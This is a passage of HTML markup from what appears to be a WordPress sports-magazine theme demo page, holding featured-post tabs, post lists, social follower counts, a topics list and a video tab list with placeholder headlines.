						<div class="ts-overlay-style featured-post post-4154 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sports category-surfing">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health7-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/">
            Marriott has new rewards offerings and you don’t need            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>March 1, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  90               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
									<div class="tab-pane ts-overlay-style fade " id="nav-post-tab-2717f7c-23" role="tabpanel" aria-labelledby="nav-2717f7c-23-tab">
						<div class="ts-overlay-style featured-post post-3718 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sketing category-sports category-surfing tag-sports">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports3-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/">
            Clock is companies underage ticking for e-cig  users            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>April 8, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  16               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
									<div class="tab-pane ts-overlay-style fade " id="nav-post-tab-2717f7c-33" role="tabpanel" aria-labelledby="nav-2717f7c-33-tab">
						<div class="ts-overlay-style featured-post post-158 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sketing category-sports category-surfing tag-sports">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports5-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">
            The clock is ticking for e-cig companies underage users            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>December 7, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  29               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
							</div>
		</div>
		<div class="col-lg-5">
			<div class="nav post-list-box" role="tablist">
									<a class="nav-item nav-link active" id="nav-2717f7c-13-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-13" role="tab" aria-controls="nav-post-tab-2717f7c-13" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/health7-455x300.jpg" alt="Marriott has new rewards offerings and you don’t need">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									Marriott has new rewards offerings and you don’t need								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									March 1, 2018								</span>
							</div>
						</div>
					</a>
									<a class="nav-item nav-link " id="nav-2717f7c-23-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-23" role="tab" aria-controls="nav-post-tab-2717f7c-23" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/sports3-455x300.jpg" alt="Clock is companies underage ticking for e-cig  users">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									Clock is companies underage ticking for e-cig users								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									April 8, 2018								</span>
							</div>
						</div>
					</a>
									<a class="nav-item nav-link " id="nav-2717f7c-33-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-33" role="tab" aria-controls="nav-post-tab-2717f7c-33" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/sports5-455x300.jpg" alt="The clock is ticking for e-cig companies underage users">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									The clock is ticking for e-cig companies underage users								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									December 7, 2018								</span>
							</div>
						</div>
					</a>
							</div>
		</div>
	</div>
	</div>
	
		<div role="tabpanel" class="tab-pane fade " id="tab-2717f7c4">
	<div class="row">
		<div class="col-lg-7">
			<div class="tab-content featured-post">
									<div class="tab-pane ts-overlay-style fade show active" id="nav-post-tab-2717f7c-14" role="tabpanel" aria-labelledby="nav-2717f7c-14-tab">
						<div class="ts-overlay-style featured-post post-190 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-sketing category-sports tag-sports">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports1-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/">
            plans to ride out Hurricane the Florence on a boat            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>January 7, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  64               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
									<div class="tab-pane ts-overlay-style fade " id="nav-post-tab-2717f7c-24" role="tabpanel" aria-labelledby="nav-2717f7c-24-tab">
						<div class="ts-overlay-style featured-post post-4154 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sports category-surfing">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health7-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/">
            Marriott has new rewards offerings and you don’t need            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>March 1, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  90               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
									<div class="tab-pane ts-overlay-style fade " id="nav-post-tab-2717f7c-34" role="tabpanel" aria-labelledby="nav-2717f7c-34-tab">
						<div class="ts-overlay-style featured-post post-3718 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sketing category-sports category-surfing tag-sports">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports3-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/">
            Clock is companies underage ticking for e-cig  users            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>April 8, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  16               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
							</div>
		</div>
		<div class="col-lg-5">
			<div class="nav post-list-box" role="tablist">
									<a class="nav-item nav-link active" id="nav-2717f7c-14-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-14" role="tab" aria-controls="nav-post-tab-2717f7c-14" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/sports1-455x300.jpg" alt="plans to ride out Hurricane the Florence on a boat">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									plans to ride out Hurricane the Florence on a boat								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									January 7, 2018								</span>
							</div>
						</div>
					</a>
									<a class="nav-item nav-link " id="nav-2717f7c-24-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-24" role="tab" aria-controls="nav-post-tab-2717f7c-24" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/health7-455x300.jpg" alt="Marriott has new rewards offerings and you don’t need">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									Marriott has new rewards offerings and you don’t need								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									March 1, 2018								</span>
							</div>
						</div>
					</a>
									<a class="nav-item nav-link " id="nav-2717f7c-34-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-34" role="tab" aria-controls="nav-post-tab-2717f7c-34" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/sports3-455x300.jpg" alt="Clock is companies underage ticking for e-cig  users">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									Clock is companies underage ticking for e-cig users								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									April 8, 2018								</span>
							</div>
						</div>
					</a>
							</div>
		</div>
	</div>
	</div>
            </div>
        </div>
      		</div>
				</div>
				<div data-id="8dd5c8d" class="elementor-element elementor-element-8dd5c8d elementor-hidden-tablet elementor-hidden-phone elementor-widget elementor-widget-image" data-element_type="image.default">
				<div class="elementor-widget-container">
					<div class="elementor-image">
										<img width="815" height="120" src="{THEMES_PAGE}/assets/css/banner_content.jpg" class="attachment-full size-full" alt="banner_content" srcset="http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/banner_content.jpg 815w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/banner_content-300x44.jpg 300w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/banner_content-768x113.jpg 768w" sizes="(max-width: 815px) 100vw, 815px">											</div>
				</div>
				</div>
				<div data-id="9c7db1c" class="elementor-element elementor-element-9c7db1c elementor-widget elementor-widget-vinazine-block-title" data-element_type="vinazine-block-title.default">
				<div class="elementor-widget-container">
			    <div class="title-area">
        
      <h2 class="ts-title block-title-style1 float-left">
      <span class="title-before"></span>
      The Best of 2018      </h2>
                     <div class="clearfix"></div>
            
    </div>
    		</div>
				</div>
				<section data-id="89e0c6d" class="elementor-element elementor-element-89e0c6d elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="77caea7" class="elementor-element elementor-element-77caea7 elementor-column elementor-col-50 elementor-inner-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="dcfd67d" class="elementor-element elementor-element-dcfd67d elementor-widget elementor-widget-vinazine-post-grid" data-element_type="vinazine-post-grid.default">
				<div class="elementor-widget-container">
			        
                              <div class="grid-item grid-md ">
                                            <div class="ts-overlay-style featured-post post-190 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-sketing category-sports tag-sports">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports1-600x398.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/"></a>
      <div class="ts-post-thumb">
          
                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
               Cricket            </a>
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/">
               plans to ride out Hurricane the Florence on a boat               </a>
            </h3>
            <ul class="post-meta-info">
                                             <li>
                  <i class="fa fa-clock-o"></i>January 7, 2018               </li>
               
                           </ul>
         </div>
      </div>
   </div>
</div>
                        
                    

                  </div>
                    


      		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="3f4e049" class="elementor-element elementor-element-3f4e049 elementor-column elementor-col-50 elementor-inner-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="5d4782a" class="elementor-element elementor-element-5d4782a elementor-widget elementor-widget-vinazine-post-list" data-element_type="vinazine-post-list.default">
				<div class="elementor-widget-container">
			        
                                                    <div class="ts-grid-item-2  grid-no-shadow ">
                                                                                                            <div class="item grid-sm ">
                                            

		    <div class="ts-post-thumb">
        <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">
            <img class="img-fluid" src="{THEMES_PAGE}/assets/css/sports2-455x300.jpg" alt="Youth vaping an epidemic with crackdown coming">
        </a>
    </div>
		<div class="post-content">
		
		<h3 class="post-title">
          <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">Youth vaping an epidemic with crackdown coming</a>		
      </h3>
		<ul class="post-meta-info">
									<li>
				<i class="fa fa-clock-o"></i>December 7, 2018			</li>
					</ul>
	</div>                                        </div>
                                                                                                                                                  <div class="item">
                                             <div class="post-content">
                                                <h4 class="post-title">
                                                      <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">  The clock is ticking for e-cig companies underage users</a>
                                                </h4>
                                                                                                   <span>
                                                      <i class="fa fa-clock-o"></i> December 7, 2018                                                   </span>
                                                                                              </div>
                                          </div>
                                                                                                                                                  <div class="item">
                                             <div class="post-content">
                                                <h4 class="post-title">
                                                      <a href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/">  Clock is companies underage ticking for e-cig users</a>
                                                </h4>
                                                                                                   <span>
                                                      <i class="fa fa-clock-o"></i> April 8, 2018                                                   </span>
                                                                                              </div>
                                          </div>
                                                                                                </div>
                                      		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
				<div data-id="452b435" class="elementor-element elementor-element-452b435 elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="e9e5415" class="elementor-element elementor-element-e9e5415 elementor-widget elementor-widget-vinazine-block-title" data-element_type="vinazine-block-title.default">
				<div class="elementor-widget-container">
			    <div class="title-area">
        
      <h2 class="ts-title block-title-style1 float-left">
      <span class="title-before"></span>
      Follow Us      </h2>
                     <div class="clearfix"></div>
            
    </div>
    		</div>
				</div>
				<div data-id="d42071b" class="elementor-element elementor-element-d42071b elementor-widget elementor-widget-wp-widget-apsc_widget" data-element_type="wp-widget-apsc_widget.default">
				<div class="elementor-widget-container">
			<div class="apsc-icons-wrapper clearfix apsc-theme-2">
                <div class="apsc-each-profile">
                                        <a class="apsc-facebook-icon clearfix" href="https://facebook.com/xpeedstudio" target="_blank">
                            <div class="apsc-inner-block">
                                <span class="social-icon"><i class="fa fa-facebook apsc-facebook"></i><span class="media-name">Facebook</span></span>
                                <span class="apsc-count">12K</span><span class="apsc-media-type">Fans</span>
                            </div>
                        </a>
                                        </div>            <div class="apsc-each-profile">
                                        <a class="apsc-twitter-icon clearfix" href="https://twitter.com/xpeedstudio" target="_blank">
                            <div class="apsc-inner-block">
                                <span class="social-icon"><i class="fa fa-twitter apsc-twitter"></i><span class="media-name">Twitter</span></span>
                                <span class="apsc-count">860</span><span class="apsc-media-type">Followers</span>
                            </div>
                        </a>
                                </div>            <div class="apsc-each-profile">
                                        <a class="apsc-google-plus-icon clearfix" href="https://plus.google.com/111082030153424480495" target="_blank">
                            <div class="apsc-inner-block">
                                <span class="social-icon"><i class="apsc-googlePlus fa fa-google-plus"></i><span class="media-name">google+</span></span>
                                <span class="apsc-count">12</span><span class="apsc-media-type">Followers</span>
                            </div>
                        </a>
                                    </div>            <div class="apsc-each-profile">
                                            <a class="apsc-instagram-icon clearfix" href="https://instagram.com/xpeeder" target="_blank">
                                <div class="apsc-inner-block">
                                    <span class="social-icon"><i class="apsc-instagram fa fa-instagram"></i><span class="media-name">Instagram</span></span>
                                    <span class="apsc-count">64</span><span class="apsc-media-type">Followers</span>
                                </div>
                            </a>
                                        </div>            <div class="apsc-each-profile">
                                        <a class="apsc-youtube-icon clearfix" href="https://www.youtube.com/channel/UCJp-j8uvirVgez7TDAmfGYA" target="_blank">
                            <div class="apsc-inner-block">
                                <span class="social-icon"><i class="apsc-youtube fa fa-youtube"></i><span class="media-name">Youtube</span></span>
                                <span class="apsc-count">89</span><span class="apsc-media-type">Subscriber</span>
                            </div>
                        </a>
                                    </div>            <div class="apsc-each-profile">
                                        <a class="apsc-dribble-icon clearfix" href="https://dribbble.com/xpeedstudio" target="_blank">
                            <div class="apsc-inner-block">
                                <span class="social-icon"><i class="apsc-dribbble fa fa-dribbble"></i><span class="media-name">dribble</span></span>
                                <span class="apsc-count">0</span><span class="apsc-media-type">Followers</span>
                            </div>
                        </a>
                                    </div></div>

		</div>
				</div>
				<div data-id="c472816" class="elementor-element elementor-element-c472816 elementor-widget elementor-widget-vinazine-post-list-tab" data-element_type="vinazine-post-list-tab.default">
				<div class="elementor-widget-container">
			        
     
        <div class="post-list-item widgets grid-no-shadow ">
            <ul class="nav nav-tabs" role="tablist">
                <li role="presentation">
                    <a class="active" href="http://vinkmag.xpeedstudio.com/sports/#home" aria-controls="home" role="tab" data-toggle="tab">
                        <i class="fa fa-clock-o"></i>
                        RECENT                    </a>
                </li>
                <li role="presentation">
                    <a href="http://vinkmag.xpeedstudio.com/sports/#profile" aria-controls="profile" role="tab" data-toggle="tab">
                        <i class="fa fa-heart"></i>
                        FAVORITES                    </a>
                </li>
            </ul>
            <div class="tab-content">
				<div role="tabpanel" class="tab-pane active ts-grid-box post-tab-list" id="home">
                                                            <div class="post-content media">    
                            <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/gallery3-455x300.jpg" alt="Martavis Bryant Is Way Higher on Jon Gruden Than Gruden Is on Bryant">
                            <div class="media-body">
                                <span class="post-tag">
                                                                <a href="http://vinkmag.xpeedstudio.com/sports/category/video/" style="color:#d72924">
                                    Video                                </a>
                                </span>
                                <h4 class="post-title">
                                <a href="http://vinkmag.xpeedstudio.com/sports/2019/01/11/martavis-bryant-is-way-higher-on-jon-gruden-than-gruden-is-on-bryant/">Martavis Bryant Is Way...</a>
                                </h4>
                            </div>
                        </div>
                                            <div class="post-content media">    
                            <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports4-455x300.jpg" alt="Vontae Davis Quit on the Bills at Halftime, Changed into">
                            <div class="media-body">
                                <span class="post-tag">
                                                                <a href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#d72924">
                                    Cricket                                </a>
                                </span>
                                <h4 class="post-title">
                                <a href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/">Vontae Davis Quit on...</a>
                                </h4>
                            </div>
                        </div>
                                            <div class="post-content media">    
                            <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports2-455x300.jpg" alt="Youth vaping an epidemic with crackdown coming">
                            <div class="media-body">
                                <span class="post-tag">
                                                                <a href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#d72924">
                                    Cricket                                </a>
                                </span>
                                <h4 class="post-title">
                                <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">Youth vaping an epidemic...</a>
                                </h4>
                            </div>
                        </div>
                                            <div class="post-content media">    
                            <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports4-455x300.jpg" alt="How did it go so wrong for Ferrari in Singapore?">
                            <div class="media-body">
                                <span class="post-tag">
                                                                <a href="http://vinkmag.xpeedstudio.com/sports/category/football/" style="color:#e21e22">
                                    Football                                </a>
                                </span>
                                <h4 class="post-title">
                                <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/how-did-it-go-so-wrong-for-ferrari-in-singapore/">How did it go...</a>
                                </h4>
                            </div>
                        </div>
                                                    </div>
                <div role="tabpanel" class="tab-pane ts-grid-box post-tab-list" id="profile">
                                                                        <div class="post-content media">    
                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/health7-455x300.jpg" alt="Theye back return to you Kennedy Darlings">
                                <div class="media-body">
                                    <span class="post-tag">
                                                                        <a href="http://vinkmag.xpeedstudio.com/sports/category/video/" style="color:#d72924">
                                        Video                                    </a>
                                    </span>
                                    <h4 class="post-title">
                                        <a href="http://vinkmag.xpeedstudio.com/sports/2017/01/08/theye-back-kennedy-darlings-return/">Theye back return to...</a>
                                    </h4>
                                </div>
                            </div>
                                                    <div class="post-content media">    
                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports2-455x300.jpg" alt="Youth vaping an epidemic with crackdown coming">
                                <div class="media-body">
                                    <span class="post-tag">
                                                                        <a href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#d72924">
                                        Cricket                                    </a>
                                    </span>
                                    <h4 class="post-title">
                                        <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">Youth vaping an epidemic...</a>
                                    </h4>
                                </div>
                            </div>
                                                    <div class="post-content media">    
                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/featured3-455x300.png" alt="Bernard the only positive, Everton crumble all over">
                                <div class="media-body">
                                    <span class="post-tag">
                                                                        <a href="http://vinkmag.xpeedstudio.com/sports/category/feature/" style="color:#d72924">
                                        Racing                                    </a>
                                    </span>
                                    <h4 class="post-title">
                                        <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/bernard-the-only-positive-everton-crumble-all-over-the-pitch/">Bernard the only positive,...</a>
                                    </h4>
                                </div>
                            </div>
                                                    <div class="post-content media">    
                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/gallery3-455x300.jpg" alt="Martavis Bryant Is Way Higher on Jon Gruden Than Gruden Is on Bryant">
                                <div class="media-body">
                                    <span class="post-tag">
                                                                        <a href="http://vinkmag.xpeedstudio.com/sports/category/video/" style="color:#d72924">
                                        Video                                    </a>
                                    </span>
                                    <h4 class="post-title">
                                        <a href="http://vinkmag.xpeedstudio.com/sports/2019/01/11/martavis-bryant-is-way-higher-on-jon-gruden-than-gruden-is-on-bryant/">Martavis Bryant Is Way...</a>
                                    </h4>
                                </div>
                            </div>
                                                            </div>
            </div>
        </div>
        


      		</div>
				</div>
				<div data-id="d109220" class="elementor-element elementor-element-d109220 elementor-widget elementor-widget-vinazine-category-list" data-element_type="vinazine-category-list.default">
				<div class="elementor-widget-container">
			            <div class="ts-grid-box widgets category-list-item  grid-no-shadow">
                
      <h2 class="ts-title block-title-style1 float-left">
      <span class="title-before"></span>
      Topics      </h2>
                     <div class="clearfix"></div>
            
                <ul class="category-list">
                                            <li><a href="http://vinkmag.xpeedstudio.com/sports/category/surfing/">Surfing<span style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">4</span></a></li>                        <li><a href="http://vinkmag.xpeedstudio.com/sports/category/sports/">Sports<span style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">7</span></a></li>                        <li><a href="http://vinkmag.xpeedstudio.com/sports/category/sketing/">Sketing<span style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">6</span></a></li>                        <li><a href="http://vinkmag.xpeedstudio.com/sports/category/football/">Football<span style="color:#ffffff; background-color:#e21e22; border-left-color:#e21e22">5</span></a></li>                        <li><a href="http://vinkmag.xpeedstudio.com/sports/category/cricket/">Cricket<span style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">6</span></a></li>                </ul>
            </div>
                
    		</div>
				</div>
				<div data-id="efe3e3f" class="elementor-element elementor-element-efe3e3f elementor-hidden-tablet elementor-hidden-phone elementor-widget elementor-widget-image" data-element_type="image.default">
				<div class="elementor-widget-container">
					<div class="elementor-image">
										<img width="255" height="280" src="{THEMES_PAGE}/assets/css/sidebar-banner1.jpg" class="attachment-large size-large" alt="">											</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="5ac5bc4" class="elementor-element elementor-element-5ac5bc4 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="05b13e5" class="elementor-element elementor-element-05b13e5 elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="f8d7cd0" class="elementor-element elementor-element-f8d7cd0 elementor-widget elementor-widget-vinazine-video-post-tab" data-element_type="vinazine-video-post-tab.default">
				<div class="elementor-widget-container">
			        
                    <div class="row">
                <div class="col-lg-8 pr-0">
                    <div class="tab-content clearfix">
                                                    <div class="tab-pane fade in active" id="video-tab-f8d7cd0-1">
                                <div class="video-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/gallery3-600x398.jpg)">
                                    <div class="post-video">
	<a href="https://youtu.be/6_P8RUqGQbM" class="ts-play-btn">
		<i class="fa fa-play" aria-hidden="true"></i>
	</a>
</div>                                </div>
                            </div>
                                                    <div class="tab-pane fade " id="video-tab-f8d7cd0-2">
                                <div class="video-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health1-600x398.jpg)">
                                    <div class="post-video">
	<a href="https://www.youtube.com/watch?v=UuXUfx2Mtvs" class="ts-play-btn">
		<i class="fa fa-play" aria-hidden="true"></i>
	</a>
</div>                                </div>
                            </div>
                                                    <div class="tab-pane fade " id="video-tab-f8d7cd0-3">
                                <div class="video-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/music1-600x398.jpg)">
                                    <div class="post-video">
	<a href="https://www.youtube.com/watch?v=UuXUfx2Mtvs" class="ts-play-btn">
		<i class="fa fa-play" aria-hidden="true"></i>
	</a>
</div>                                </div>
                            </div>
                                                    <div class="tab-pane fade " id="video-tab-f8d7cd0-4">
                                <div class="video-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/themes/vinazine/assets/images/default_thumb.jpg)">
                                    <div class="post-video">
	<a href="https://www.youtube.com/watch?v=vlDzYIIOYmM" class="ts-play-btn">
		<i class="fa fa-play" aria-hidden="true"></i>
	</a>
</div>                                </div>
                            </div>
                                                    <div class="tab-pane fade " id="video-tab-f8d7cd0-5">
                                <div class="video-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health9-600x398.jpg)">
                                    <div class="post-video">
	<a href="https://youtu.be/6_P8RUqGQbM" class="ts-play-btn">
		<i class="fa fa-play" aria-hidden="true"></i>
	</a>
</div>                                </div>
                            </div>
                                                    <div class="tab-pane fade " id="video-tab-f8d7cd0-6">
                                <div class="video-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health7-600x398.jpg)">
                                    <div class="post-video">
	<a href="https://youtu.be/tO01J-M3g0U" class="ts-play-btn">
		<i class="fa fa-play" aria-hidden="true"></i>
	</a>
</div>                                </div>
                            </div>
                                            </div>
                </div>
                
                <div class="col-lg-4 pl-0">
                    <div class="video-tab-list bg-dark-item video-tab-scrollbar mCustomScrollbar _mCS_1" id="video-tab-scrollbar"><div id="mCSB_1" class="mCustomScrollBox mCS-light mCSB_vertical mCSB_inside" style="max-height: none;" tabindex="0"><div id="mCSB_1_container" class="mCSB_container" style="position:relative; top:0; left:0;" dir="ltr">
                        <ul class="nav nav-pills post-tab-list">
                                                    <li class="active">
                                <a href="http://vinkmag.xpeedstudio.com/sports/#video-tab-f8d7cd0-1" data-toggle="tab">
                                    <div class="post-content media">
                                        <img class="d-flex sidebar-img mCS_img_loaded" src="{THEMES_PAGE}/assets/css/gallery3-455x300.jpg" alt="Martavis Bryant Is Way Higher on Jon Gruden Than Gruden Is on Bryant">
                                        <div class="media-body align-self-center">
                                            <h4 class="post-title">
                                                Martavis Bryant Is Way Higher on Jon Gruden Than Gruden Is on Bryant                                            </h4>
                                        </div>
                                    </div>
                                </a>
                            </li>
                                                    <li class="">
                                <a href="http://vinkmag.xpeedstudio.com/sports/#video-tab-f8d7cd0-2" data-toggle="tab">
                                    <div class="post-content media">
                                        <img class="d-flex sidebar-img mCS_img_loaded" src="{THEMES_PAGE}/assets/css/health1-455x300.jpg" alt="Backward leg allows young cancer survivor to dance">
                                        <div class="media-body align-self-center">
